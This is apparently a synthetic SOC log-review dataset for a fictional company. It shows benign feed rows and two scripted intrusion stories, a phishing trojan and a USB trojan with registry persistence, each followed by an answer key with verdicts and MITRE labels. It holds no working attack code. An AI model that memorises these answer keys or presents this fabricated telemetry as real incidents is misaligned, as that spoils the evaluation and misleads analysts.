# Rendered-log sample for expert review (2026-10-02)

Each block = one feed row as the analyst sees it (row line + the record shown in the expanded panel).
The ANSWER KEY for each story is at the end of that story, after the evidence — read the evidence first.


## nexacorp — stack {"edr":"crowdstrike","firewall":"fortigate","vpn":"anyconnect","idp":"okta","collab":"google_workspace","dns":"infoblox"} (effective products: edr=CrowdStrike Falcon, firewall=Fortinet FortiGate, vpn=Cisco AnyConnect, idp=Okta, collab=Google Workspace, dns=Infoblox)

### Background feed sample (benign noise)

- 2026-05-10T08:00:00.000Z | badge=ad | vendor=Windows Security | sev=informational | host=WS-FIN-2847 | user=j.chen | "Signed in to WS-FIN-2847"

LEGACY VIEW (no native module) raw:
```json
{
 "event.code": "4624",
 "winlog.channel": "Security",
 "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
 "winlog.record_id": "1048297",
 "winlog.event_data.SubjectUserSid": "S-1-5-18",
 "winlog.event_data.SubjectUserName": "WS-FIN-2847$",
 "winlog.event_data.SubjectDomainName": "NEXACORP",
 "winlog.event_data.SubjectLogonId": "0x3e7",
 "winlog.event_data.TargetUserSid": "S-1-5-21-3421479547-3897544621-1789562108-1101",
 "winlog.event_data.TargetUserName": "jchen",
 "winlog.event_data.TargetDomainName": "NEXACORP",
 "winlog.event_data.TargetLogonId": "0x7b3912",
 "winlog.event_data.LogonType": "2",
 "winlog.event_data.LogonProcessName": "User32",
 "winlog.event_data.AuthenticationPackageName": "Kerberos",
 "winlog.event_data.WorkstationName": "WS-FIN-2847",
 "winlog.event_data.TransmittedServices": "-",
 "winlog.event_data.LmPackageName": "-",
 "winlog.event_data.KeyLength": "0",
 "winlog.event_data.ProcessId": "0x288",
 "winlog.event_data.ProcessName": "C:\\Windows\\System32\\winlogon.exe",
 "winlog.event_data.IpAddress": "10.10.20.14",
 "winlog.event_data.IpPort": "0",
 "event.action": "logged-in",
 "event.outcome": "success",
 "user.name": "NEXACORP\\jchen",
 "source.ip": "10.10.20.14",
 "host.name": "WS-FIN-2847"
}
```

- 2026-05-10T08:45:00.000Z | badge=windows_security | vendor=Windows Security | sev=informational | host=SRV-NXC-DC01 | user=- | "ScheduledDefrag task ran on SRV-NXC-DC01"

LEGACY VIEW (no native module) raw:
```json
{
 "event.code": "201",
 "winlog.channel": "Microsoft-Windows-TaskScheduler/Operational",
 "task.name": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
 "task.author": "Microsoft Corporation",
 "task.status": "completed",
 "host.name": "SRV-NXC-DC01"
}
```

- 2026-05-10T08:32:00.000Z | badge=okta | vendor=Okta | sev=low | host=- | user=a.jones | "Two-factor push for GitHub Enterprise approved"

NATIVE — Okta Workforce Identity (System Log) (okta/user.authentication.auth_via_mfa)
```json
{
 "actor": {
  "alternateId": "a.jones@nexacorp.com",
  "detailEntry": null,
  "displayName": "A Jones",
  "id": "00up6t2aJ5tI23WVxka6",
  "type": "User"
 },
 "authenticationContext": {
  "authenticationProvider": "FACTOR_PROVIDER",
  "authenticationStep": 0,
  "credentialProvider": "OKTA_CREDENTIAL_PROVIDER",
  "credentialType": null,
  "externalSessionId": "102weTHAD1CiDRVLgYD2zWiXC",
  "interface": null,
  "issuer": null
 },
 "client": {
  "device": "Computer",
  "geographicalContext": {
   "city": "London",
   "country": "United Kingdom",
   "geolocation": {
    "lat": 51.5085,
    "lon": -0.1257
   },
   "postalCode": "EC1A",
   "state": "England"
  },
  "id": null,
  "ipAddress": "82.102.14.211",
  "userAgent": {
   "browser": "CHROME",
   "os": "Windows 10",
   "rawUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
  },
  "zone": "null"
 },
 "debugContext": {
  "debugData": {
   "authnRequestId": "21E9QtDPPDfrVOuHdvfImu4BCva",
   "dtHash": "9cdf7564bccecf029d4fd426ffb8e51a794e59bf2baf58936ff932f2572558c5",
   "factor": "OKTA_VERIFY_PUSH",
   "factorIntent": "LOGIN",
   "promptingPolicyTypes": "[OKTA_SIGN_ON]",
   "pushOnlyResponseType": "OV_RESPONSE_APPROVE",
   "requestId": "ItgeMwOfGPFA66tlaGUJeZZAAAm",
   "requestUri": "/idp/idx/authenticators/poll",
   "risk": "{level=LOW}",
   "threatSuspected": "false",
   "url": "/idp/idx/authenticators/poll?"
  }
 },
 "device": null,
 "displayMessage": "Authentication of user via MFA",
 "eventType": "user.authentication.auth_via_mfa",
 "legacyEventType": "core.user.factor.attempt_success",
 "outcome": {
  "reason": null,
  "result": "SUCCESS"
 },
 "published": "2026-05-10T08:32:00.000Z",
 "request": {
  "ipChain": [
   {
    "geographicalContext": {
     "city": "London",
     "country": "United Kingdom",
     "geolocation": {
      "lat": 51.5085,
      "lon": -0.1257
     },
     "postalCode": "EC1A",
     "state": "England"
    },
    "ip": "82.102.14.211",
    "source": null,
    "version": "V4"
   }
  ]
 },
 "securityContext": {
  "asNumber": 2856,
  "asOrg": "british telecommunications plc",
  "domain": "bt.com",
  "isProxy": false,
  "isp": "bt"
 },
 "severity": "INFO",
 "target": [
  {
   "alternateId": "a.jones@nexacorp.com",
   "detailEntry": null,
   "displayName": "A Jones",
   "id": "00up6t2aJ5tI23WVxka6",
   "type": "User"
  },
  {
   "alternateId": "unknown",
   "detailEntry": {
    "methodTypeUsed": "Get a push notification",
    "methodUsedVerifiedProperties": "[USER_PRESENCE]"
   },
   "displayName": "Okta Verify"
```

- 2026-05-10T08:41:00.000Z | badge=sysmon | vendor=Microsoft Sysmon | sev=informational | host=LT-ENG-4405 | user=- | "LT-ENG-4405 looked up registry.npmjs.org"

NATIVE — Microsoft Sysinternals Sysmon (sysmon/22)
```
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2026-05-10T08:41:00.0000000Z"/><EventRecordID>684654002</EventRecordID><Correlation/><Execution ProcessID="3644" ThreadID="7465"/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LT-ENG-4405.nexacorp.com</Computer><Security UserID="S-1-5-18"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2026-05-10 08:41:00.000</Data><Data Name="ProcessGuid">{1634d2a5-dfb0-98f8-f43c-2d261585e734}</Data><Data Name="ProcessId">13549</Data><Data Name="QueryName">registry.npmjs.org</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">type: 1 104.16.119.96;</Data><Data Name="Image">C:\Program Files\nodejs\node.exe</Data><Data Name="User">-</Data></EventData></Event>
```

- 2026-05-10T08:37:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=informational | host=LT-OPS-4502 | user=l.clark | "Ran python.exe script on LT-OPS-4502"

NATIVE — CrowdStrike Falcon (crowdstrike/ProcessRollup2)
```json
{
 "AuthenticationId": "1301241",
 "CommandLine": "python.exe",
 "ComputerName": "LT-OPS-4502",
 "ConfigBuild": "1007.3.0019807.1",
 "ConfigStateHash": "2843740104",
 "EffectiveTransmissionClass": "3",
 "Entitlements": "15",
 "EventOrigin": "1",
 "ImageFileName": "\\Device\\HarddiskVolume3\\Python311\\python.exe",
 "ImageSubsystem": "3",
 "IntegrityLevel": "8192",
 "LocalAddressIP4": "10.56.115.163",
 "ParentAuthenticationId": "1301241",
 "ParentBaseFileName": "cmd.exe",
 "ParentProcessId": "292305100144",
 "ProcessCreateFlags": "1024",
 "ProcessEndTime": "",
 "ProcessParameterFlags": "24577",
 "ProcessStartTime": "1778402220.000",
 "ProcessSxsFlags": "64",
 "RawProcessId": "5550",
 "SessionId": "1",
 "SourceProcessId": "292305100144",
 "SourceThreadId": "116598412922",
 "Tags": "25, 27, 874, 12094627905582, 12094627906234",
 "TargetProcessId": "233352766672",
 "TokenType": "1",
 "UserSid": "S-1-5-21-2393362532-2443695389-446917770-7280",
 "WindowFlags": "128",
 "aid": "153fa331d28c658b33b41252b11c80ee",
 "aip": "176.175.78.10",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "event_platform": "Win",
 "event_simpleName": "ProcessRollup2",
 "id": "78ada9fb-b91b-436d-a864-b42d3aad1a3d",
 "name": "ProcessRollup2V19",
 "timestamp": "1778402220307"
}
```

- 2026-05-10T08:47:00.000Z | badge=linux_audit | vendor=Linux auditd | sev=informational | host=srv-linux-web01 | user=- | "ubuntu ran sudo apt-get upgrade on srv-linux-web01"

NATIVE — Linux auditd (linux_auditd/USER_CMD)
```
type=USER_CMD msg=audit(1778402820.000:634925): pid=8844 uid=1001 auid=1001 ses=1409 msg='cwd="/home/ubuntu" cmd=2F7573722F62696E2F6170742D6765742075706772616465202D79 terminal=pts/1 res=success'
```

- 2026-05-10T08:00:00.000Z | badge=ueba | vendor=Microsoft Sentinel UEBA | sev=informational | host=WS-FIN-2847 | user=j.chen | "Daily risk score update for j.chen — within normal range"

LEGACY VIEW (no native module) raw:
```json
{
 "ueba.vendor": "Microsoft Sentinel UEBA",
 "ueba.entity_type": "user",
 "ueba.entity_id": "j.chen@nexacorp.com",
 "ueba.risk_score": 14,
 "ueba.baseline_score": 12,
 "ueba.anomaly_type": "none",
 "ueba.peer_group": "Finance",
 "ueba.behavior": "normal_login_pattern",
 "ueba.period": "last_30d",
 "ueba.baseline_logins_per_day": "3.2",
 "ueba.observed_logins_today": "4",
 "ueba.deviation": "0.8",
 "ueba.indicators": [],
 "event.action": "risk-score-update",
 "event.outcome": "normal",
 "user.name": "j.chen@nexacorp.com"
}
```

- 2026-05-10T18:00:00.000Z | badge=k8s_audit | vendor=Kubernetes Audit | sev=low | host=SRV-NXC-K8SNODE01 | user=t.harris | "Kubernetes ConfigMap updated in production"

NATIVE — Kubernetes Audit (k8s_audit/Event)
```json
{
 "kind": "Event",
 "apiVersion": "audit.k8s.io/v1",
 "level": "Request",
 "auditID": "9856ae85-57ae-4f5f-ac66-5ac168e130e4",
 "stage": "ResponseComplete",
 "requestURI": "/api/v1/namespaces/production/configmaps/api-server-config",
 "verb": "update",
 "user": {
  "username": "t.harris@nexacorp.com",
  "groups": [
   "system:authenticated",
   "ops-team"
  ]
 },
 "objectRef": {
  "resource": "configmaps",
  "namespace": "production",
  "name": "api-server-config",
  "apiGroup": "",
  "apiVersion": "v1"
 },
 "responseStatus": {
  "metadata": {},
  "code": 200
 },
 "requestReceivedTimestamp": "2026-05-10T18:00:00.000134Z",
 "stageTimestamp": "2026-05-10T18:00:00.000388Z",
 "userAgent": "kubectl/v1.30.0 (linux/amd64)",
 "sourceIPs": [
  "10.0.0.55"
 ],
 "requestObject": {
  "data": {
   "LOG_LEVEL": "info",
   "MAX_CONNECTIONS": "100",
   "DB_TIMEOUT": "30s"
  }
 },
 "annotations": {
  "authorization.k8s.io/decision": "allow",
  "authorization.k8s.io/reason": ""
 }
}
```

- 2026-05-10T08:08:00.000Z | badge=ad | vendor=Windows Security | sev=informational | host=SRV-NXC-DC01 | user=j.chen | "Computer requested access to a file share on SRV-FILE01"

LEGACY VIEW (no native module) raw:
```json
{
 "event.code": "4769",
 "winlog.channel": "Security",
 "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
 "winlog.event_data.TargetUserName": "j.chen@NEXACORP.COM",
 "winlog.event_data.TargetDomainName": "NEXACORP.COM",
 "winlog.event_data.ServiceName": "cifs/SRV-FILE01.nexacorp.com",
 "winlog.event_data.ServiceSid": "S-1-5-21-3421479547-3897544621-1789562108-1601",
 "winlog.event_data.TicketOptions": "0x40810000",
 "winlog.event_data.TicketEncryptionType": "0x12",
 "winlog.event_data.IpAddress": "::ffff:10.10.20.14",
 "winlog.event_data.IpPort": "54883",
 "winlog.event_data.Status": "0x0",
 "event.action": "kerberos-service-ticket-request",
 "event.outcome": "success",
 "source.ip": "10.10.20.14",
 "host.name": "SRV-NXC-DC01"
}
```

- 2026-05-10T09:31:00.000Z | badge=dlp | vendor=Microsoft Purview | sev=low | host=WS-ENG-3301 | user=k.taylor | "Printed a contract containing client personal data — allowed and logged for audit"

LEGACY VIEW (no native module) raw:
```json
{
 "data.office365.Operation": "DlpRuleMatch",
 "data.office365.Workload": "Endpoint",
 "data.office365.UserId": "k.taylor@nexacorp.com",
 "data.office365.PolicyDetails[0].PolicyName": "Endpoint Print Audit",
 "data.office365.PolicyDetails[0].Rules[0].RuleName": "Audit print of sensitive documents",
 "data.office365.PolicyDetails[0].Rules[0].Actions[0]": "GenerateAlert",
 "data.office365.PolicyDetails[0].Rules[0].ConditionsMatched.SensitiveInformation[0].SensitiveInformationTypeName": "EU Driver's License Number",
 "data.office365.PolicyDetails[0].Rules[0].ConditionsMatched.SensitiveInformation[0].Count": "2",
 "data.office365.EndpointMetaData.FileExtension": "docx",
 "data.office365.EndpointMetaData.FileName": "Contract-GlobalLogis-2026.docx",
 "data.office365.EndpointMetaData.Application": "WINWORD.EXE",
 "data.office365.EndpointMetaData.EgressType": "Print",
 "data.office365.EndpointMetaData.PrinterName": "HP-Color-Laserjet-3rd-Floor",
 "event.action": "dlp-rule-match",
 "event.outcome": "allowed-with-audit",
 "host.name": "WS-ENG-3301"
}
```


### Story: phishing-malware (foundation) — Phishing Attachment → Malware Execution → Workstation Compromise

- 2026-05-20T10:15:00.000Z | badge=email_gateway | vendor=Proofpoint TAP | sev=medium | host=- | user=device-svc | "Received an email"

NATIVE — Proofpoint Targeted Attack Protection (TAP) (proofpoint/messagesDelivered)
```json
{
 "GUID": "DShwBQfu9OqbK5sdM7mXl0FUjyDSp4iT",
 "QID": "48l0FU435298",
 "id": "03ddf345-0440-4182-b70e-fe4824710b33",
 "cluster": "nexacorp_hosted",
 "messageID": "<3f8b2a71-shiptrack-delivery-48213@shiptrack-express.info>",
 "messageTime": "2026-05-20T10:15:00.000Z",
 "sender": "notifications@shiptrack-express.info",
 "senderIP": "45.148.10.77",
 "fromAddress": [
  "notifications@shiptrack-express.info"
 ],
 "headerFrom": "notifications@shiptrack-express.info",
 "headerReplyTo": null,
 "replyToAddress": [],
 "recipient": [
  "device-svc@nexacorp.com"
 ],
 "toAddresses": [
  "device-svc@nexacorp.com"
 ],
 "ccAddresses": [],
 "subject": "Your Package Could Not Be Delivered — Action Required",
 "messageSize": 28095,
 "xmailer": null,
 "spamScore": 3,
 "phishScore": 0,
 "malwareScore": 62,
 "impostorScore": 0,
 "completelyRewritten": false,
 "modulesRun": [
  "access",
  "av",
  "zerohour",
  "spf",
  "dkimv",
  "spam",
  "dmarc",
  "pdr",
  "sandbox",
  "urldefense"
 ],
 "policyRoutes": [
  "default_inbound"
 ],
 "quarantineFolder": null,
 "quarantineRule": null,
 "messageParts": [
  {
   "disposition": "inline",
   "filename": "text.txt",
   "contentType": "text/plain",
   "oContentType": "text/plain",
   "md5": "4399d9107a683ba7a3b553f78429b815",
   "sha256": "e93b4d48c8b32ea9685af481eba4449f070ed8ccbf0ae56c960aca136133b2fc",
   "sandboxStatus": null
  },
  {
   "disposition": "inline",
   "filename": "text.html",
   "contentType": "text/html",
   "oContentType": "text/html",
   "md5": "aa181fe4646b7d47e10103bbc98d2dd7",
   "sha256": "15511393102ce5e5307557d6d34916806ecca9e3c1b5232a5a3fe792c114f6b4",
   "sandboxStatus": null
  },
  {
   "disposition": "attached",
   "filename": "Delivery_Notice_48213.zip",
   "contentType": "application/zip",
   "oContentType": "application/zip",
   "md5": "6aa7b6f68ed713d0dbb7857367d4573f",
   "sha256": "9f36af8af9da13db19df1debfc4831732c02d4031d5039b69fade846580d052c",
   "sandboxStatus": "threat"
  }
 ],
 "threatsInfoMap": [
  {
   "threatID": "9f36af8af9da13db19df1debfc4831732c02d4031d5039b69fade846580d052c",
   "threat": "9f36af8af9da13db19df1debfc4831732c02d4031d5039b69fade846580d052c",
   "threatType": "attachment",
   "classification": "malware",
   "threatStatus": "active",
   "threatTime": "2026-05-20T10:36:31.000Z",
   "threatUrl": "https://threatinsight.proofpoint.com/8e15bdb1-1b78-4c3b-a493-607251287d84/threat/email/9f36af8af9da13db19df1debfc4831732c02d4031d5039b69fade846580d052c",
   "campaignID": null
  }
 ]
}
```

- 2026-05-20T10:21:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=high | host=WS-OPS-2214 | user=device-svc | "explorer.exe started Delivery_Notice_48213.pdf.exe on WS-OPS-2214"

NATIVE — CrowdStrike Falcon (crowdstrike/ProcessRollup2)
```json
{
 "AuthenticationId": "3024315",
 "AuthenticodeHashData": "439a25b7741ed5478a80220758a0e16adf2db97d5af6532e129819b8655972a2",
 "CommandLine": "\"C:\\Users\\device-svc\\Downloads\\Delivery_Notice_48213.pdf.exe\"",
 "ComputerName": "WS-OPS-2214",
 "ConfigBuild": "1007.3.0019807.1",
 "ConfigStateHash": "976188326",
 "EffectiveTransmissionClass": "3",
 "Entitlements": "15",
 "EventOrigin": "1",
 "ImageFileName": "\\Device\\HarddiskVolume3\\Users\\device-svc\\Downloads\\Delivery_Notice_48213.pdf.exe",
 "ImageSubsystem": "2",
 "IntegrityLevel": "8192",
 "LocalAddressIP4": "10.10.20.63",
 "ParentAuthenticationId": "3024315",
 "ParentBaseFileName": "explorer.exe",
 "ParentProcessId": "213918152553",
 "ProcessCreateFlags": "1024",
 "ProcessEndTime": "",
 "ProcessParameterFlags": "24577",
 "ProcessStartTime": "1779272460.000",
 "ProcessSxsFlags": "64",
 "RawProcessId": "6624",
 "SHA1HashData": "0000000000000000000000000000000000000000",
 "SHA256HashData": "b233d674e7dc3fe283d858e8bbb0423c88dfba9b23eb9ca9ca9701c7da1186a8",
 "SessionId": "1",
 "SourceProcessId": "213918152553",
 "SourceThreadId": "186131693092",
 "Tags": "25, 27, 874, 12094627905582, 12094627906234",
 "TargetProcessId": "211610441356",
 "TokenType": "1",
 "UserSid": "S-1-5-21-2393362532-2443695389-446917770-8361",
 "WindowFlags": "128",
 "aid": "e83f761b5b13a51df8be1239b6774960",
 "aip": "176.175.78.10",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "event_platform": "Win",
 "event_simpleName": "ProcessRollup2",
 "id": "ae532345-6099-4016-8d96-e74748417fdb",
 "name": "ProcessRollup2V19",
 "timestamp": "1779272460788"
}
```

- 2026-05-20T10:21:45.000Z | badge=firewall | vendor=Fortinet FortiGate | sev=high | host=WS-OPS-2214 | user=device-svc | "WS-OPS-2214 connected to shiptrack-updates-net.xyz"

NATIVE — Fortinet FortiGate (FortiOS) (fortigate/utm/webfilter)
```
date=2026-05-20 time=10:21:45 devname="FGT-HQ-01" devid="FG200FTK19118636" eventtime=1779272505000000000 tz="+0000" logid="0317013312" type="utm" subtype="webfilter" eventtype="ftgd_allow" level="notice" vd="root" policyid=33 poluuid="91917eba-5597-47d3-8d89-dc7c3d04794d" policytype="policy" sessionid=43118503 user="device-svc" authserver="NEXACORP-FSSO" srcip=10.10.20.63 srcport=51204 srccountry="Reserved" srcintf="port2" srcintfrole="lan" dstip=185.220.101.204 dstport=443 dstintf="port1" dstintfrole="wan" proto=6 service="HTTPS" hostname="shiptrack-updates-net.xyz" profile="Corp-WebFilter" action="passthrough" reqtype="direct" url="https://shiptrack-updates-net.xyz/" sentbyte=4608 rcvdbyte=51200 direction="outgoing" msg="URL belongs to an allowed category in policy" method="domain" cat=91 catdesc="Newly Registered Domain"
```

- 2026-05-20T10:24:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=critical | host=WS-OPS-2214 | user=device-svc | "Threat detected on WS-OPS-2214"

NATIVE — CrowdStrike Falcon (crowdstrike/alert)
```json
{
 "agent_id": "e83f761b5b13a51df8be1239b6774960",
 "aggregate_id": "aggind:e83f761b5b13a51df8be1239b6774960:22071851521",
 "alleged_filetype": "exe",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "cloud_indicator": "false",
 "cmdline": "C:\\Users\\device-svc\\Downloads\\Delivery_Notice_48213.pdf.exe",
 "composite_id": "f282819d35e587637e1279e41c90bd3d:ind:e83f761b5b13a51df8be1239b6774960:272655453043-32902-3371680",
 "confidence": 90,
 "context_timestamp": "2026-05-20T10:24:00.000Z",
 "control_graph_id": "ctg:e83f761b5b13a51df8be1239b6774960:22071851521",
 "created_timestamp": "2026-05-20T10:24:13.164285395Z",
 "data_domains": [
  "Endpoint"
 ],
 "description": "Known trojan signature match — file and its parent process were quarantined and killed.",
 "display_name": "known_malware_family",
 "device": {
  "agent_load_flags": "0",
  "agent_version": "7.29.19807.0",
  "cid": "f282819d35e587637e1279e41c90bd3d",
  "config_id_build": "19807",
  "device_id": "e83f761b5b13a51df8be1239b6774960",
  "external_ip": "176.175.78.10",
  "first_seen": "2026-02-14T22:59:57Z",
  "hostname": "WS-OPS-2214",
  "last_seen": "2026-05-20T10:15:35Z",
  "local_ip": "10.23.127.181",
  "mac_address": "0a-ba-aa-bc-06-b9",
  "machine_domain": "NEXACORP.COM",
  "os_version": "Windows 11",
  "platform_name": "Windows",
  "product_type": "1",
  "product_type_desc": "Workstation",
  "status": "normal"
 },
 "falcon_host_link": "https://falcon.us-1.crowdstrike.com/activity-v2/detections/f282819d35e587637e1279e41c90bd3d:ind:e83f761b5b13a51df8be1239b6774960:272655453043-32902-3371680?_cid=f282819d35e587637e1279e41c90bd3d",
 "filename": "Delivery_Notice_48213.pdf.exe",
 "filepath": "\\Device\\HarddiskVolume3\\Users\\device-svc\\Downloads\\Delivery_Notice_48213.pdf.exe",
 "id": "ind:e83f761b5b13a51df8be1239b6774960:272655453043-32902-3371680",
 "indicator_id": "ind:e83f761b5b13a51df8be1239b6774960:272655453043-32902-3371680",
 "local_process_id": "11140",
 "logon_domain": "NEXACORP",
 "name": "known_malware_family",
 "objective": "Follow Through",
 "pattern_disposition": 2048,
 "pattern_disposition_description": "Prevention, process killed.",
 "pattern_disposition_details": {
  "blocking_unsupported_or_disabled": false,
  "bootup_safeguard_enabled": false,
  "critical_process_disabled": false,
  "detect": false,
  "fs_operation_blocked": false,
  "handle_operation_downgraded": false,
  "inddet_mask": false,
  "indicator": false,
  "kill_action_failed": false,
  "kill_parent": false,
  "kill_process": true,
  "kill_subprocess": false,
  "operation_blocked": false,
  "policy_disabled": false,
 
```

#### ANSWER KEY — phishing-malware
- evt_pm_01_email: verdict=tp mitre=T1566.001 authored: device-svc received an email with a ZIP attachment (Delivery_Notice_48213.zip) from an external sender impersonating a shipping company. SPF and DKIM both failed.
- evt_pm_02_execute: verdict=tp mitre=T1204.002 authored: device-svc extracted the ZIP and ran Delivery_Notice_48213.pdf.exe from the Downloads folder on WS-OPS-2214; explorer.exe was the parent process.
- evt_pm_03_beacon: verdict=tp mitre=T1071.001 authored: WS-OPS-2214 opened an outbound HTTPS session to shiptrack-updates-net.xyz, a domain registered 2 days ago; the firewall allowed the session.
- evt_pm_04_detect: verdict=tp mitre=T1204.002 authored: CrowdStrike Falcon quarantined Delivery_Notice_48213.pdf.exe on WS-OPS-2214, matching a known commodity trojan signature (family: Glupteba-variant).


### Story: usb-malware (foundation) — Malicious USB Drive → Trojan Persistence → Workstation Compromise

- 2026-05-22T13:30:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=low | host=WS-OPS-2214 | user=s.levi | "USB_Backup_Tool.exe was copied from a removable USB drive (E:\) to the Desktop on WS-OPS-2214."

NATIVE — CrowdStrike Falcon (crowdstrike/PeFileWritten)
```json
{
 "AuthenticationId": "3236248",
 "ComputerName": "WS-OPS-2214",
 "ConfigBuild": "1007.3.0019807.1",
 "ConfigStateHash": "976188326",
 "ContextProcessId": "214639037004",
 "ContextThreadId": "133556538560",
 "ContextTimeStamp": "1779456600.000",
 "DiskParentDeviceInstanceId": "PCI\\VEN_144D&DEV_A80A&SUBSYS_0B0F1028&REV_00\\4&d99b7c80&0&0008",
 "DllCharacteristics": "33120",
 "EffectiveTransmissionClass": "3",
 "Entitlements": "15",
 "EventOrigin": "1",
 "FileCategory": "6",
 "FileEcpBitmask": "0",
 "FileIdentifier": "70d7f5aca04dffdf0896bd2ef2d68e6ad7c80212e4431d95",
 "FileObject": "0",
 "FileOperatorSid": "S-1-5-21-2393362532-2443695389-446917770-5551",
 "FileWrittenFlags": "0",
 "ImageCheckSum": "0",
 "ImageEntryPoint": "373202",
 "ImageSubsystem": "2",
 "ImageTimeStamp": "1764606233",
 "IrpFlags": "0",
 "IsOnNetwork": "0",
 "IsOnRemovableDisk": "0",
 "IsTransactedFile": "0",
 "LocalAddressIP4": "10.23.127.181",
 "MajorFunction": "0",
 "MinorFunction": "0",
 "ModuleCharacteristics": "34",
 "OperationFlags": "0",
 "SHA256HashData": "e5f78b3e3cd7901e89bfd8da08ff1dd412acf7452ba5027f031c6efe64e7196f",
 "Size": "245760",
 "TargetFileName": "\\Device\\HarddiskVolume3\\Users\\s.levi\\Desktop\\USB_Backup_Tool.exe",
 "TokenType": "1",
 "UserName": "s.levi",
 "aid": "e83f761b5b13a51df8be1239b6774960",
 "aip": "176.175.78.10",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "event_platform": "Win",
 "event_simpleName": "PeFileWritten",
 "id": "4ef6c1ff-56c5-4505-aff5-727521fc022a",
 "name": "PeFileWrittenV14",
 "timestamp": "1779456600782"
}
```

- 2026-05-22T13:33:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=high | host=WS-OPS-2214 | user=s.levi | "explorer.exe started USB_Backup_Tool.exe on WS-OPS-2214"

NATIVE — CrowdStrike Falcon (crowdstrike/ProcessRollup2)
```json
{
 "AuthenticationId": "3236248",
 "AuthenticodeHashData": "e250c0f1e37720785ef624b45e8c004e9b62f7ada9209a82591aba3f324e189b",
 "CommandLine": "\"C:\\Users\\s.levi\\Desktop\\USB_Backup_Tool.exe\"",
 "ComputerName": "WS-OPS-2214",
 "ConfigBuild": "1007.3.0019807.1",
 "ConfigStateHash": "976188326",
 "EffectiveTransmissionClass": "3",
 "Entitlements": "15",
 "EventOrigin": "1",
 "ImageFileName": "\\Device\\HarddiskVolume3\\Users\\s.levi\\Desktop\\USB_Backup_Tool.exe",
 "ImageSubsystem": "2",
 "IntegrityLevel": "8192",
 "LocalAddressIP4": "10.10.20.19",
 "ParentAuthenticationId": "3236248",
 "ParentBaseFileName": "explorer.exe",
 "ParentProcessId": "213918152553",
 "ProcessCreateFlags": "1024",
 "ProcessEndTime": "",
 "ProcessParameterFlags": "24577",
 "ProcessStartTime": "1779456780.000",
 "ProcessSxsFlags": "64",
 "RawProcessId": "7712",
 "SHA1HashData": "0000000000000000000000000000000000000000",
 "SHA256HashData": "e5f78b3e3cd7901e89bfd8da08ff1dd412acf7452ba5027f031c6efe64e7196f",
 "SessionId": "1",
 "SourceProcessId": "213918152553",
 "SourceThreadId": "186131693092",
 "Tags": "25, 27, 874, 12094627905582, 12094627906234",
 "TargetProcessId": "250278403484",
 "TokenType": "1",
 "UserSid": "S-1-5-21-2393362532-2443695389-446917770-5551",
 "WindowFlags": "128",
 "aid": "e83f761b5b13a51df8be1239b6774960",
 "aip": "176.175.78.10",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "event_platform": "Win",
 "event_simpleName": "ProcessRollup2",
 "id": "21d5fe78-7d7b-43c9-86e2-7e5d754844f4",
 "name": "ProcessRollup2V19",
 "timestamp": "1779456780536"
}
```

- 2026-05-22T13:33:20.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=high | host=WS-OPS-2214 | user=s.levi | "A process set registry value SystemBackupSvc on WS-OPS-2214"

NATIVE — CrowdStrike Falcon (crowdstrike/AsepValueUpdate)
```json
{
 "AuthenticationId": "3236248",
 "ComputerName": "WS-OPS-2214",
 "ConfigBuild": "1007.3.0019807.1",
 "ConfigStateHash": "976188326",
 "ContextProcessId": "211652166381",
 "ContextThreadId": "115422442727",
 "ContextTimeStamp": "1779456800.000",
 "EffectiveTransmissionClass": "3",
 "Entitlements": "15",
 "EventOrigin": "1",
 "LocalAddressIP4": "10.23.127.181",
 "RegObjectName": "\\REGISTRY\\USER\\S-1-5-21-2393362532-2443695389-446917770-5551\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
 "RegOperationType": "1",
 "RegStringValue": "C:\\Users\\s.levi\\Desktop\\USB_Backup_Tool.exe",
 "RegType": "1",
 "RegValueName": "SystemBackupSvc",
 "TargetFileName": "\\Device\\HarddiskVolume3\\Users\\s.levi\\Desktop\\USB_Backup_Tool.exe",
 "TokenType": "1",
 "aid": "e83f761b5b13a51df8be1239b6774960",
 "aip": "176.175.78.10",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "event_platform": "Win",
 "event_simpleName": "AsepValueUpdate",
 "id": "2fbe11cf-0ddc-4246-809b-4c3552e964c0",
 "name": "AsepValueUpdateV7",
 "timestamp": "1779456800298"
}
```

- 2026-05-22T13:35:00.000Z | badge=edr | vendor=CrowdStrike Falcon | sev=critical | host=WS-OPS-2214 | user=s.levi | "Threat detected on WS-OPS-2214"

NATIVE — CrowdStrike Falcon (crowdstrike/alert)
```json
{
 "agent_id": "e83f761b5b13a51df8be1239b6774960",
 "aggregate_id": "aggind:e83f761b5b13a51df8be1239b6774960:34155731127",
 "alleged_filetype": "exe",
 "cid": "f282819d35e587637e1279e41c90bd3d",
 "cloud_indicator": "false",
 "cmdline": "C:\\Users\\s.levi\\Desktop\\USB_Backup_Tool.exe",
 "composite_id": "f282819d35e587637e1279e41c90bd3d:ind:e83f761b5b13a51df8be1239b6774960:211652166381-32902-7142405",
 "confidence": 90,
 "context_timestamp": "2026-05-22T13:35:00.000Z",
 "control_graph_id": "ctg:e83f761b5b13a51df8be1239b6774960:34155731127",
 "created_timestamp": "2026-05-22T13:35:11.776107642Z",
 "data_domains": [
